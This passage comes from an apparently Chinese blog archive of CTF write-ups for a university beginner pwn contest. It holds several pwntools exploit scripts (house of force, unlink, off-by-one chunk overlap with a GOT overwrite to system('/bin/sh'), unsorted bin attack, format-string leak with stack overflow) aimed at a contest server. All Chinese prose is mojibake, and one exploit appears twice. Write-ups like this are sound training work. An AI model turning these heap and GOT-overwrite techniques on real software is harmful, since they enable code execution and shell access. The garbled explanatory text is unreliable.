<p>é‚£æˆ‘ä»¬åº”è¯¥æ€ä¹ˆç”³è¯·å¤§å°å‘¢ï¼Œæˆ‘ä»¬éœ€è¦â€œåæ’¤æ­¥â€ï¼Œå°±æ˜¯è´Ÿå‘ç”³è¯·åœ°å€ã€‚é‚£å¤§å°å‘¢ï¼Œæœ€èµ·ç åº”è¯¥æ˜¯0x40+0x20ï¼Œç„¶ååŠ ä¸Šä¸€ä¸ªå¤´éœ€è¦çš„åœ°å€ï¼ˆ0xfï¼‰ä¸å°¾éƒ¨topå‰å¯ç”¨çš„ç©ºé—´ï¼ˆ0x8ï¼‰ã€‚</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213175814153.png" alt="image-20201213175814153"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10014</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400D1B</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"ddaa"</span>)</span><br><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line">malloc = offset_to_heap_base - <span class="number">0x8</span> - <span class="number">0xf</span></span><br><span class="line">add(malloc,<span class="string">"dddd"</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(magic) * <span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>è´Ÿå‘ç”³è¯·ç„¶åæ‰“è¿‡å»ï¼Œç„¶åè¿™é‡Œåº”è¯¥å¯ä»¥åªè¦ç”³è¯·è¶³å¤Ÿå¤§ ç„¶åæŠŠé‡Œé¢å†…å®¹å…¨è¦†ç›–ä¸ºåé—¨å‡½æ•° ç›´æ¥è°ƒç”¨åº”è¯¥éƒ½å¯ä»¥</p>
<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>å¯ä»¥å»çœ‹æˆ‘åˆšæ€»ç»“çš„å †</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/unlink_smallbin_intro.png" alt="img"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"><span class="meta">#coding=utf-8</span></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">#context.log_level = 'debug'</span><br><span class="line">p = process('./pwn5')</span><br><span class="line">#p = remote('219.219.61.234','10014')</span><br><span class="line">elf = ELF('./pwn5')</span><br><span class="line"></span><br><span class="line">libc = elf.libc</span><br><span class="line">def add(<span class="built_in">size</span>,con):</span><br><span class="line">	p.sendlineafter('Your choice:','2')</span><br><span class="line">	p.sendlineafter('Plz input the size of item name:',str(size))</span><br><span class="line">	p.sendafter('Plz input the name:',con)</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter('Your choice:','4')</span><br><span class="line">	p.sendlineafter('Plz enter the index of item:',str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendlineafter('Your choice:','1')</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">change</span><span class="params">(idx,<span class="built_in">size</span>,con)</span>:</span></span><br><span class="line">    p.sendlineafter('Your choice:','3')</span><br><span class="line">    p.sendlineafter('Plz enter the index of item:',str(idx))</span><br><span class="line">    p.sendlineafter('Plz enter the length of item name:',str(size))</span><br><span class="line">    p.sendafter('Plz enter the new name of the item:',con)</span><br><span class="line">buf = <span class="number">0x06020b8</span></span><br><span class="line">sys = <span class="number">0x400D1B</span></span><br><span class="line">add(0x60,'ccc')</span><br><span class="line">add(0x58,'aaa')</span><br><span class="line">add(0x80,'bbb')</span><br><span class="line">add(0x60,'eee')</span><br><span class="line">add(0x60,'fff')</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)</span><br><span class="line">payload += p64(buf - <span class="number">0x18</span>) </span><br><span class="line">payload += p64(buf - <span class="number">0x10</span>)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x30</span></span><br><span class="line">payload += p64(<span class="number">0x50</span>)+p8(<span class="number">0x90</span>) </span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x40</span>,p64(<span class="number">0x60</span>)*<span class="number">3</span>+ p64(<span class="number">0x6020a8</span>))</span><br><span class="line">change(1,0x40,p64(elf.got['free']))</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x40</span>,p64(sys)*<span class="number">2</span>)</span><br><span class="line"><span class="meta"># delete(3)</span></span><br><span class="line"><span class="meta"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h1><blockquote>
<p>changeå‡½æ•°ä¸­å­˜åœ¨å•å­—èŠ‚æº¢å‡ºæ¼æ´</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;if ( heap[v1] ) </span><br><span class="line">&gt;&#123; 	printf(&quot;Content of heap : &quot;);</span><br><span class="line">	read_input(heap[v1][1], *heap[v1] + 1LL);</span><br><span class="line">	puts(&quot;Done !&quot;); </span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨å•å­—èŠ‚æº¢å‡ºæ¼æ´æ„é€ fake_chunk,freeä¹‹åå†æ¬¡åˆ†é…é€ æˆoverlap,ä»è€Œä»»æ„åœ°å€è¯»å†™</p>
<p>æ³„éœ²å‡ºlibcåŸºåœ°å€ï¼Œä¿®æ”¹gotè¡¨ï¼Œæœ€åget_shell</p>
</blockquote>
<p>æ¯•ç«Ÿä¸€å¼€å§‹åšå †é¢˜ï¼Œä¸Šæ¥å…ˆåˆ†æï¼Œå°½é‡è¯¦ç»†ç‚¹</p>
<blockquote>
<p>addå‡½æ•°</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219204952738.png" alt="image-20201219204952738"></p>
<p>å…¶ä¸­æ•°æ®ç»“æ„ä¸º</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219205027638.png" alt="image-20201219205027638"></p>
<p>changeå‡½æ•°</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219205113774.png" alt="image-20201219205113774"></p>
</blockquote>
<p>ç›´æ¥çœ‹expåˆ†æå§</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10015</span>)</span><br><span class="line">heap = ELF(<span class="string">'./pwn6'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = heap.got[<span class="string">'free'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'AAAA'</span>) <span class="comment">#1</span></span><br><span class="line">change(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x20</span>) + p64(heap.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr -libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">change(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>å…ˆè¯´ä¸€ä¸‹æ€è·¯</p>
<ul>
<li>å•å­—èŠ‚æº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹chunk_sizeæ¥overlapï¼Œè¾¾åˆ°ä»»æ„è¯»å†™çš„ç›®çš„</li>
<li>ç”±äºåé—¨å‡½æ•°æ²¡æœ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±åº”è¯¥æƒ³è°ƒç”¨systemå‡½æ•°ï¼Œé¦–è¦çš„å°±æ˜¯æ³„éœ²libcåŸºå€ï¼Œå…¶æ¬¡è·å–systemå‡½æ•°</li>
<li>æ”¹freeçš„gotè¡¨ è¾¾åˆ°è°ƒç”¨</li>
</ul>
<p>è¿™é‡Œæ¥å†™ä¸€ä¸‹expçš„æ€è·¯</p>
<ol>
<li>å…ˆç”³è¯·ä¸¤ä¸ªå †å—ï¼Œä¹‹åä¿®æ”¹ç¬¬ä¸€ä¸ªå †å—ï¼Œç¬¬ä¸€ä¸ªå †å—å¯ä»¥å†™å…¥/bin/shçš„å‚æ•°ï¼Œç„¶åæˆ‘ä»¬ä¿®æ”¹ç¬¬äºŒä¸ªå †å—çš„sizeï¼Œä½¿å…¶è¿›å…¥fastbinä¸­ï¼Œè®©æˆ‘ä»¬å†æ¬¡åˆ†é…</li>
<li>æˆ‘ä»¬è¿›è¡Œé‡æ–°åˆ†é…ï¼Œè¿™æ˜¯å°±å¯ä»¥ä»»æ„å†™ï¼ŒæŠŠgotè¡¨ä¸­çš„freeå†™è¿›å»ï¼Œç„¶åè¯»å‡ºæ¥ï¼Œæ³„éœ²åŸºå€</li>
<li>ä¿®æ”¹freeçš„gotè¡¨ä¸ºsystemçš„åœ°å€ç„¶åç›´æ¥free(0)ä¹Ÿå°±è°ƒç”¨äº†/bin/sh</li>
</ol>
<p>ä¸‹é¢æ˜¯å…³é”®æˆªå›¾</p>
<p>å†™å…¥/bin/sh</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220211422639.png" alt="image-20201220211422639"></p>
<p>é‡Šæ”¾1ä¹‹å</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220211752814.png" alt="image-20201220211752814"></p>
</blockquote>
<h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>è¿™é‡Œè¯´ä¸€ä¸‹æˆ‘è‡ªå·±çš„é—®é¢˜</p>
<p>æˆ‘ä¸€ç›´è®¤ä¸ºfakechunkè¢«é‡Šæ”¾åè¿›å…¥fastbinä¸­ï¼Œæˆ‘ä¸€ç›´è®¤ä¸ºfastbinä¸­åªæœ‰ä¸€ä¸ªchunk</p>
<p>çŸ¥é“æˆ‘æƒŠäººåœ°å‘ç°å®ƒå±…ç„¶æ˜¯freeäº†ä¸¤å›æ˜¯ä¸¤ä¸ªchunk </p>
<p>æˆ‘æ‰é†’æ‚Ÿ</p>
<p>ä¸ºä»€ä¹ˆå®ƒä¸ç›´æ¥ä»top chunkä¸­åˆ†é…ï¼ˆæˆ‘ä¸ªfwï¼Œç›¯ç€çœ‹äº†ä¸¤ä¸ªå°æ—¶ä¹Ÿæ²¡çœ‹å‡ºæ¥ï¼‰</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220223150743.png" alt="image-20201220223150743"></p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220223239931.png" alt="image-20201220223239931"></p>
<p>æ€»ç»“ï¼Œè‡ªå·±æ€»æ˜¯åœ¨è‡ªå·±æƒ³è¿™ä¸ªå †æ€ä¹ˆè¿è¡Œï¼Œå¾ˆå°‘å»è°ƒè¯•ã€‚è¿˜æ˜¯åº”è¯¥å¤šåŠ¨æ‰‹ï¼ˆè¦ä¸æ˜¯æˆ‘è°ƒè¯•èƒ½åŠ›ä¸å¤ªè¡Œï¼‰</p>
<h1 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h1><blockquote>
<p>å¾ˆç®€å•çš„unsorted bin attack,åˆ©ç”¨æ­¤æ”»å‡»ä¿®æ”¹flagä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°å°±å¯ä»¥è·å¾—shelläº†</p>
<p>å…³äºunsorted bin attackå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10016</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#def show(idx):</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline("3")</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline(str(idx))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x6020a0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = flag - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">"a"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"666"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="pwn8"><a href="#pwn8" class="headerlink" title="pwn8"></a>pwn8</h1><blockquote>
<p>addç”³è¯·çš„æ—¶å€™,å¦‚æœsizeä¸ç¬¦åˆæ¡ä»¶,ä¼šè¿”å›,è€Œeditçš„æ—¶å€™,æ²¡æœ‰æ£€æµ‹,æ‰€ä»¥é€šè¿‡æ®‹ç•™ä¿¡æ¯æ¥æ§åˆ¶æŒ‡é’ˆ,å®ç°</p>
<p>ä»»æ„å†™</p>
</blockquote>
]]></content>
      <categories>
        <category>å¤ç°</category>
      </categories>
      <tags>
        <tag>å †</tag>
        <tag>å¤ç°</tag>
      </tags>
  </entry>
  <entry>
    <title>CUMT2020å…¥é—¨èµ›</title>
    <url>/2020/11/28/CUMT2020%E5%85%A5%E9%97%A8%E8%B5%9B/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="CUMT2020å…¥é—¨èµ›"><a href="#CUMT2020å…¥é—¨èµ›" class="headerlink" title="CUMT2020å…¥é—¨èµ›"></a>CUMT2020å…¥é—¨èµ›</h1><p>æœ¬ä¸å‡†å¤‡å†™çš„ï¼Œä¸»è¦tclï¼Œè¿˜æ˜¯ç•™ä¸ªå‘ä½ç­‰è€ƒå®Œè¯•æ¥å¤ç°</p>
<p>ä¸»è¦å¯¹å †ä¸ç†è§£ï¼Œå¹¶ä¸”ä¸æ‡‚æ¼æ´åˆ©ç”¨ç‚¹åœ¨å“ªé‡Œ</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h3><p>ncè¿æ¥æ‹¿flag</p>
<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwnlib <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwnlib <span class="keyword">import</span> context</span><br><span class="line"><span class="keyword">from</span> pwnlib.tubes.remote <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">from</span> pwnlib.tubes.process <span class="keyword">import</span> process</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwnlib.elf.elf <span class="keyword">import</span> ELF</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> make_packer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = make_packer(word_size=<span class="number">64</span>)</span><br><span class="line">bd = <span class="number">0x400756</span></span><br><span class="line"><span class="comment">#r = process("./overflow")</span></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10011</span>)</span><br><span class="line">r.recvuntil(<span class="string">b'Welcome to CTF2020!\n'</span>)</span><br><span class="line">r.recvuntil(<span class="string">b'Please input your username\n'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b'%11$p'</span>)</span><br><span class="line">pp = r.recv()</span><br><span class="line">print(pp)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b'a'</span>*<span class="number">0x28</span> + p(int(pp, <span class="number">16</span>)) + <span class="string">b'a'</span>*<span class="number">8</span> + p(<span class="number">0x400756</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p>æ ˆæº¢å‡º</p>
<h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><p>æ•´æ•°æº¢å‡º</p>
<p>è¾“å…¥65536</p>
<p>å¾—åˆ°shell</p>
<h3 id="pwn5-fail"><a href="#pwn5-fail" class="headerlink" title="pwn5(fail)"></a>pwn5(fail)</h3><p>å…ˆè´´expï¼Œè€ƒå®Œè¯•æ¥å­¦ä¹ </p>
<p>æ¼æ´ç‚¹æƒ³çš„æ˜¯ä¸€æ ·çš„</p>
<p>ä½†å…¶ä¸­æœ‰äº›ç»†èŠ‚ä¸å¤ªæ‡‚</p>
<blockquote>
<p>åˆ©ç”¨changeå‡½æ•°ä¸­å­˜åœ¨çš„ä»»æ„å­—èŠ‚å †æº¢å‡ºæ„é€ house of forceæ”»å‡»</p>
<p>å…³äºhouse of forceä¸æ‡‚å¾—çš„å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10014</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400D1B</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"ddaa"</span>)</span><br><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line">malloc = offset_to_heap_base - <span class="number">0x8</span> - <span class="number">0xf</span></span><br><span class="line">add(malloc,<span class="string">"dddd"</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(magic) * <span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn6-fail"><a href="#pwn6-fail" class="headerlink" title="pwn6(fail)"></a>pwn6(fail)</h3><blockquote>
<p>changeå‡½æ•°ä¸­å­˜åœ¨å•å­—èŠ‚æº¢å‡ºæ¼æ´</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;if ( heap[v1] ) </span><br><span class="line">&gt;&#123; 	printf(&quot;Content of heap : &quot;);</span><br><span class="line">	read_input(heap[v1][1], *heap[v1] + 1LL);</span><br><span class="line">	puts(&quot;Done !&quot;); </span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨å•å­—èŠ‚æº¢å‡ºæ¼æ´æ„é€ fake_chunk,freeä¹‹åå†æ¬¡åˆ†é…é€ æˆoverlap,ä»è€Œä»»æ„åœ°å€è¯»å†™</p>
<p>æ³„éœ²å‡ºlibcåŸºåœ°å€ï¼Œä¿®æ”¹gotè¡¨ï¼Œæœ€åget_shell</p>
</blockquote>
